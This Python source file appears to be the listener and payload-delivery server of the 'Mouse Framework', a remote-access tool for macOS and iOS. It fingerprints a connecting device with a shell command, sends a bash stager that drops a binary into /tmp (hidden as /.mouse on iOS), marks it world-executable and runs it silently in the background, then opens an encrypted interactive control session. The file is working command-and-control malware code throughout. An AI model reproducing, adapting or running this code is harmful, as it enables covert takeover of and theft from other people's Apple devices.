#!/usr/bin/env python3

#            ---------------------------------------------------
#                              Mouse Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import socket, ssl, os, json, sys
import core.helper as h
import core.session as session
import binascii
from core.multihandler import MultiHandler
import time

class Server:
    def __init__(self):
        self.macos_architectures = ["i386"]
        self.ios_architectures = ["arm64","armv7s", "arm"]
        self.host = None
        self.port = None
        self.sos = None
        self.debug = False
        self.is_multi = False
        self.modules_macos = self.import_modules("core/commands/macos")
        self.modules_ios = self.import_modules("core/commands/ios")
        self.modules_local = self.import_modules("core/commands/local")
        self.modules_universal = self.import_modules("core/commands/universal")
        self.multihandler = MultiHandler(self)

  
    def import_modules(self,path):
        sys.path.append(path)
        modules = dict()
        for mod in os.listdir(path):
            if mod == '__init__.py' or mod[-3:] != '.py':
                continue
            else:
                m = __import__(mod[:-3]).command()
                modules[m.name] = m
        return modules


    def get_modules(self,device_type):
        if device_type == "macos": 
            result = self.modules_macos
            self.sos = "macOS"
        elif device_type == "iOS":
            result = self.modules_ios
            self.sos = "iOS"
        result.update(self.modules_universal)
        return result

    def set_host_port(self):
        try:
            lhost = h.getip()
            lport = None
            choice = input(h.info_general_raw("Local host: ")).strip(" ")
            if choice != "":
                lhost = choice
            while True:
                lport = input(h.info_general_raw("Local port: ")).strip(" ")
                if not lport:
                    lport = 4444
                try:
                    lport = int(lport)
                except ValueError:
                    h.info_error("Invalid port, please enter a valid integer.")
                    continue
                if lport < 1024:
                    h.info_error("Invalid port, please enter a value >= 1024.")
                    continue
                break
            h.info_general("Using "+lhost+":"+str(lport)+"...")
            self.host = socket.gethostbyname(lhost)
            self.port = lport
            return True
        except KeyboardInterrupt:
            return

    def verbose_print(self,text):
        if self.is_multi == False:
            h.info_general(text)


    def debug_print(self,text):
        if self.debug:
            h.info_warning(text)


    def start_single_handler(self):
        session = self.listen_for_stager()
        if session:
            session.interact()


    def start_multi_handler(self):
        self.multihandler.start_background_server()
        self.multihandler.interact()
        print("")


    def craft_payload(self,device_arch):
        if not self.host:
            h.info_error("Local host is not set!")
            return
        if not self.port:
            h.info_error("Local port is not set!")
            return
        payload_parameter = h.b64(json.dumps({"ip":self.host,"port":self.port,"debug":self.debug}))
        if device_arch in self.macos_architectures:
            self.verbose_print("Connecting to macOS...")
            self.verbose_print("Sending macOS payload...")
            f = open("data/payloads/macos", "rb")
            payload = f.read()
            f.close()
            #save to tmp, 
            instructions = \
            "cat >/private/tmp/mouse;"+\
            "chmod 777 /private/tmp/mouse;"+\
            "/private/tmp/mouse "+payload_parameter.decode()+" 2>/dev/null &\n"
            self.verbose_print("Executing macOS payload...")
            return (instructions,payload)
        elif device_arch in self.ios_architectures:
            self.verbose_print("Connecting to iOS...")
            self.verbose_print("Sending iOS payload...")
            f = open("data/payloads/ios", "rb")
            payload = f.read()
            f.close()
            instructions = \
            "cat >/tmp/mouse;"+\
            "chmod 777 /tmp/mouse;"+\
            "mv /tmp/mouse /.mouse;"+\
            "/.mouse "+payload_parameter.decode()+" 2>/dev/null &\n"
            self.verbose_print("Executing iOS payload...") 
            return (instructions,payload)
        else:
            h.info_error("The device is not recognized!")
            return

    def listen_for_stager(self):
        identification_shell_command = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
        
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', self.port))
        s.listen(1)
        self.verbose_print("Listening on port "+str(self.port)+"...")
        try:
            conn, addr = s.accept()
        except KeyboardInterrupt:
            s.close()
            return

        hostAddress = addr[0]
        self.verbose_print("Connecting to "+hostAddress+"...")
        conn.send(identification_shell_command.encode())
        try:
            device_arch = conn.recv(128).decode().strip()
            if not device_arch:
                return
        except:
            return

        try:
            bash_stager, executable = self.craft_payload(device_arch)
        except Exception as e:
            input("Press enter to continue...").strip(" ")
            return
        self.debug_print(bash_stager.strip())
        conn.send(bash_stager.encode())

        conn.send(executable)
        conn.close()
        self.verbose_print("Establishing Connection...")

        try:
            return self.listen_for_executable_payload(s)
        except ssl.SSLError as e:
            h.info_error("SSL error: " + str(e))
            return
        except Exception as e:
            h.info_error("Error: " + str(e))
            return


    def listen_for_executable_payload(self,s):
        ssl_con, hostAddress = s.accept()
        s.settimeout(5)
        ssl_sock = ssl.wrap_socket(ssl_con,
                                 server_side=True,
                                 certfile=".keys/server.crt",
                                 keyfile=".keys/server.key",
                                 ssl_version=ssl.PROTOCOL_SSLv23)
        raw = ssl_sock.recv(256).decode()
        device_info = json.loads(raw)
        return session.Session(self,ssl_sock,device_info)
        

    def update_session(self,old_session):
        new_session = self.listen_for_stager()
        old_session.conn = new_session.conn
        old_session.hostname = new_session.hostname
        old_session.username = new_session.username
        old_session.type = new_session.type
